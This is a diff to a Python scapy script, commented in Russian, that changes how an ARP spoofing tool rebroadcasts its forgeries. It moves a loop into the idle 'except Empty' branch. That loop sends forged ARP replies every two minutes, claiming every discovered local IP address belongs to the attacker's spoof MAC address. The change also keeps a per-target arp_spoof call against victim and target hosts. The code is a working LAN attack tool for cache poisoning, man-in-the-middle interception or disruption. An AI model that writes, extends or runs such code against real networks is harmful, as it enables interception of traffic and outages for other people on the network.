@@ -358,15 +358,22 @@ def main():
                         # Отправляем ARP-подделку, если прошло более 1 минут
                         arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
                         last_spoof_time[target_ip] = time.time()
-                    elif not quiet_mode and time.time() - global_resend_time >= renew_arp_spoof_time:
-                        # Переотправка в эфир подделки собой всех найденных локальных ip
-                        log.info("Gone 2 minutes, resending arp spoof to all known")
-                        for i in range(len(old_list)):
-                            arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
-                            log.info(f"Resent arp spoof about {old_list[i]}")
-                            sendp(arp_packet, verbose=0, count=3)
+            if not quiet_mode and time.time() - global_resend_time >= renew_arp_spoof_time:
+                # Переотправка в эфир подделки собой всех найденных локальных ip
+                log.info(f"Gone 2 minutes, resending arp spoof to all known {old_list}")
+                for i in range(len(old_list)):
+                    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
+                    log.info(f"Resent arp spoof about {old_list[i]}")
+                    sendp(arp_packet, verbose=0, count=3)
         except Empty:
             # Ожидаем новые данные
+            if not quiet_mode and time.time() - global_resend_time >= renew_arp_spoof_time:
+                # Переотправка в эфир подделки собой всех найденных локальных ip
+                log.info(f"Gone 2 minutes, resending arp spoof to all known {old_list}")
+                for i in range(len(old_list)):
+                    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
+                    log.info(f"Resent arp spoof about {old_list[i]}")
+                    sendp(arp_packet, verbose=0, count=3)
             pass
         except OSError as e:
             if verbose_enabled:
